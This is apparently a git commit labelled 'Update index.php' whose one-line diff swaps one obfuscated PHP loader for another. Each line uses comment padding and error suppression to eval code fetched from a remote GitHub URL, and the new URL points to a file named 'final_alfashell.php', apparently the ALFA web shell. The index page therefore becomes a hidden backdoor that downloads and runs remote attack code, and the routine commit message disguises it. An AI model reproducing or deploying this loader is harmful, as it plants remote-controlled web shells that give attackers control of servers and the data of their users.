c2e0ceb1b80918cfb84a78d1fdd4c0f67a72fa2a
Denizly Furqan <31403046+zycoder0day@users.noreply.github.com>
2023-02-22 11:58:38 +0000

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/raminfp/DeObfuscation_ALFA_SHELL_V3/blob/master/decode_stage_2.php"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/raminfp/DeObfuscation_ALFA_SHELL_V3/master/final_alfashell.php"));/**/?>
